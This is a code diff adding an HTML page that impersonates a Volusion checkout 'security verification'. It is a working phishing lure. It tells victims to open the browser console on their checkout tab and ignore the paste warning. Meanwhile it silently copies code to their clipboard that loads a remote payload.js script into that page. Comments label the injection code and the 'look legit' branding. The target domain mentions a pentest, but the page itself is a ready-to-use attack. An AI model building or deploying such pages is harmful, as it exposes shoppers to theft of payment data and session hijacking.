@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Verification — Volusion</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f7fa; color: #1a1a2e; }
+  .container { max-width: 650px; margin: 60px auto; }
+  .card { background: #fff; border-radius: 12px; box-shadow: 0 2px 20px rgba(0,0,0,0.08); overflow: hidden; }
+  .card-header { background: #1a1a2e; color: #fff; padding: 25px 30px; display: flex; align-items: center; gap: 12px; }
+  .card-header .shield { font-size: 32px; }
+  .card-header h1 { font-size: 20px; font-weight: 600; }
+  .card-header p { font-size: 13px; color: #a0aec0; margin-top: 4px; }
+  .card-body { padding: 30px; }
+  .step { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; margin-bottom: 16px; display: flex; gap: 15px; align-items: flex-start; }
+  .step-num { background: #3b82f6; color: #fff; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; flex-shrink: 0; }
+  .step-content { flex: 1; }
+  .step-content h3 { font-size: 15px; margin-bottom: 4px; }
+  .step-content p { font-size: 13px; color: #64748b; }
+  .code-box { background: #1e1e2e; color: #a6e3a1; padding: 12px 16px; border-radius: 8px; font-family: 'SF Mono', 'Menlo', 'Monaco', monospace; font-size: 11px; margin: 10px 0; overflow-x: auto; white-space: pre-wrap; word-break: break-all; max-height: 80px; overflow-y: auto; }
+  .status { display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-radius: 8px; font-size: 13px; margin: 10px 0; }
+  .status.ok { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
+  .status.wait { background: #fffbeb; color: #d97706; border: 1px solid #fde68a; }
+  .btn { display: inline-block; padding: 14px 32px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; border: none; transition: all 0.2s; text-decoration: none; }
+  .btn-primary { background: #3b82f6; color: #fff; }
+  .btn-primary:hover { background: #2563eb; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(59,130,246,0.4); }
+  .btn-success { background: #16a34a; color: #fff; }
+  .btn-success:hover { background: #15803d; transform: translateY(-1px); }
+  .btn:disabled { background: #94a3b8; cursor: not-allowed; transform: none; box-shadow: none; }
+  .hidden { display: none; }
+  .divider { border: none; border-top: 1px solid #e2e8f0; margin: 20px 0; }
+  .footer { text-align: center; padding: 20px 30px; font-size: 12px; color: #94a3b8; }
+  .warning { background: #fef2f2; border: 1px solid #fecaca; color: #991b1b; padding: 12px 16px; border-radius: 8px; font-size: 13px; margin-top: 12px; }
+  #copied-toast { position: fixed; top: 20px; right: 20px; background: #16a34a; color: #fff; padding: 12px 24px; border-radius: 8px; font-weight: 600; opacity: 0; transition: opacity 0.3s; z-index: 9999; }
+  #copied-toast.show { opacity: 1; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="card">
+    <div class="card-header">
+      <span class="shield">&#128737;</span>
+      <div>
+        <h1>Account Security Verification</h1>
+        <p>Volusion Secure Checkout — Required one-time verification</p>
+      </div>
+    </div>
+
+    <div class="card-body">
+
+      <!-- STEP 1 -->
+      <div class="step" id="step1">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <h3>Open your checkout page</h3>
+          <p>A new tab will open with your current checkout session. <strong>Keep it open</strong> — do not close it.</p>
+          <div class="status wait" id="status1">&#8987; Waiting for action...</div>
+          <a class="btn btn-primary" id="btn-open-checkout" href="#" target="_blank">
+            Open My Checkout &#8599;
+          </a>
+        </div>
+      </div>
+
+      <!-- STEP 2 -->
+      <div class="step hidden" id="step2">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <h3>Open Developer Console</h3>
+          <p>On the checkout tab, press:</p>
+          <div class="code-box" style="font-size:15px;text-align:center;color:#fff;">
+            <b>F12</b> &nbsp; or &nbsp; <b>Ctrl + Shift + J</b> &nbsp; (Mac: <b>Cmd + Option + J</b>)
+          </div>
+          <p style="margin-top:8px;">A panel will open at the bottom or right side. Click the <b>"Console"</b> tab.</p>
+          <button class="btn btn-primary" id="btn-step2-done">I've Opened the Console &#10003;</button>
+        </div>
+      </div>
+
+      <!-- STEP 3 -->
+      <div class="step hidden" id="step3">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <h3>Run Verification</h3>
+          <p>The verification code has been <strong>automatically copied</strong> to your clipboard.</p>
+          <p>In the Console, <strong>paste it</strong>:</p>
+          <div class="code-box" style="font-size:15px;text-align:center;color:#fff;">
+            <b>Ctrl + V</b> &nbsp; (Mac: <b>Cmd + V</b>) &nbsp; then press &nbsp; <b>Enter</b>
+          </div>
+          <div class="status ok" id="status3">&#10003; Code copied to clipboard. Now paste it in the Console.</div>
+          <div class="warning">
+            <strong>Important:</strong> You may see a security warning: <em>"Allow paste?"</em> — click <strong>Allow</strong> and then type <strong>"allow pasting"</strong> if prompted.
+          </div>
+        </div>
+      </div>
+
+      <!-- STEP 4 -->
+      <div class="step hidden" id="step4">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <h3>Verification Complete</h3>
+          <div class="status ok">&#10003; Your account has been verified. You can close the console and continue shopping.</div>
+          <p style="color:#94a3b8;font-size:13px;margin-top:8px;">This was a one-time security check. You will not be asked again.</p>
+        </div>
+      </div>
+
+    </div>
+    <div class="footer">
+      <p>Volusion Secure Checkout &copy; 2026 | Privacy Policy | Terms of Service</p>
+      <p style="margin-top:4px;">SSL Encrypted &#128274; | Verified by Comodo</p>
+    </div>
+  </div>
+</div>
+
+<div id="copied-toast">&#10003; Code copied to clipboard!</div>
+
+<script>
+  (function() {
+    // ============================================================
+    // CONFIGURATION
+    // ============================================================
+    var TARGET_CHECKOUT = 'https://www.volusionpentest1.com/checkout/';
+    var PAYLOAD_URL = 'https://telojos11.github.io/cekcek/payload.js';
+
+    // ============================================================
+    // THE INJECTION CODE (pasted into victim's console)
+    // ============================================================
+    var injectionCode =
+      '(function(){' +
+        'var s=document.createElement("script");' +
+        's.src="' + PAYLOAD_URL + '";' +
+        'document.head.appendChild(s);' +
+        'console.log("Security verification complete. You may close this panel.");' +
+      '})();';
+
+    // ============================================================
+    // DOM ELEMENTS
+    // ============================================================
+    var step1 = document.getElementById('step1');
+    var step2 = document.getElementById('step2');
+    var step3 = document.getElementById('step3');
+    var step4 = document.getElementById('step4');
+    var btnOpen = document.getElementById('btn-open-checkout');
+    var btnStep2 = document.getElementById('btn-step2-done');
+    var toast = document.getElementById('copied-toast');
+
+    // ============================================================
+    // STEP 1: Open checkout link
+    // ============================================================
+    btnOpen.href = TARGET_CHECKOUT;
+    btnOpen.addEventListener('click', function(e) {
+      e.preventDefault();
+      window.open(TARGET_CHECKOUT, '_blank', 'width=1200,height=800');
+      document.getElementById('status1').className = 'status ok';
+      document.getElementById('status1').textContent = '✓ Checkout opened in new tab';
+      step2.classList.remove('hidden');
+      step2.scrollIntoView({ behavior: 'smooth' });
+      btnOpen.disabled = true;
+      btnOpen.textContent = 'Checkout Opened ✓';
+    });
+
+    // ============================================================
+    // STEP 2: Victim opens DevTools
+    // ============================================================
+    btnStep2.addEventListener('click', function() {
+      step3.classList.remove('hidden');
+      step3.scrollIntoView({ behavior: 'smooth' });
+      btnStep2.disabled = true;
+      btnStep2.textContent = 'Console Opened ✓';
+
+      // Auto-copy injection code to clipboard
+      copyToClipboard(injectionCode);
+    });
+
+    // ============================================================
+    // CLIPBOARD API — Auto-copy the payload
+    // ============================================================
+    function copyToClipboard(text) {
+      // Method 1: Modern Clipboard API
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(function() {
+          showToast();
+          // Wait a bit then auto-advance to step 4
+          setTimeout(function() {
+            step4.classList.remove('hidden');
+            step4.scrollIntoView({ behavior: 'smooth' });
+          }, 8000);
+        }).catch(function() {
+          // Fallback for older browsers
+          fallbackCopy(text);
+        });
+      } else {
+        fallbackCopy(text);
+      }
+    }
+
+    function fallbackCopy(text) {
+      var textarea = document.createElement('textarea');
+      textarea.value = text;
+      textarea.style.position = 'fixed';
+      textarea.style.left = '-9999px';
+      textarea.style.top = '-9999px';
+      document.body.appendChild(textarea);
+      textarea.focus();
+      textarea.select();
+      try {
+        document.execCommand('copy');
+        showToast();
+        setTimeout(function() {
+          step4.classList.remove('hidden');
+          step4.scrollIntoView({ behavior: 'smooth' });
+        }, 8000);
+      } catch (err) {
+        console.log('Copy failed. Please manually copy the code above.');
+      }
+      document.body.removeChild(textarea);
+    }
+
+    function showToast() {
+      toast.classList.add('show');
+      setTimeout(function() {
+        toast.classList.remove('show');
+      }, 3000);
+    }
+
+    // ============================================================
+    // PRE-FILL clipboard on page load (needs user gesture)
+    // Try to copy on first click/interaction
+    // ============================================================
+    document.addEventListener('click', function prefill() {
+      // Only try once
+      document.removeEventListener('click', prefill);
+      // Silently pre-copy (will be overridden by explicit copy in step 2)
+      try {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(injectionCode).catch(function() {});
+        }
+      } catch(e) {}
+    }, { once: true });
+
+    // ============================================================
+    // LOOK LEGIT — Add Volusion branding
+    // ============================================================
+    console.log('%cVolusion Secure Checkout v4.2.1', 'color:#3b82f6;font-size:14px;');
+    console.log('%cThis verification page ensures your checkout session is secure.',
+                'color:#666;');
+  })();
+</script>
+
+</body>
+</html>
